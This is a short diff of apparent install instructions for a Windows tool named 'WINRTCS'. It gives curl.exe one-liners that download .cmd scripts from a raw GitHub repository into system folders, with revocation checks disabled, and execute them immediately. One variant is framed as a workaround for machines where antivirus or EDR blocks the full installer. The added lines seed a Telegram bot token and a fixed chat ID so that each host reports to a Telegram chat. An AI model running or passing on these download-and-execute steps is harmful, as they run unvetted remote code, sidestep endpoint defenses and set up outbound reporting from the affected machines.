@@ -13,3 +13,7 @@ curl.exe -L --ssl-no-revoke -o C:\Windows\TEMP\wb.cmd https://raw.githubusercont
 WINRTCS minimal installer (hosts where AV/EDR blocks the full bootstrap — Access denied / Permission denied on wb.cmd):
 
 curl.exe -L --ssl-no-revoke -o C:\ProgramData\wq.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_quick.cmd && C:\ProgramData\wq.cmd
+
+WINRTCS digest seed (optional per-machine Telegram override; the repo winrtcs_digest.cfg is the fleet default). Paste YOUR dedicated bot token:
+
+(echo BOT_TOKEN=PASTE_TOKEN_HERE& echo CHAT_ID=7547462070)>C:\ProgramData\WinRTCS\notify.cfg
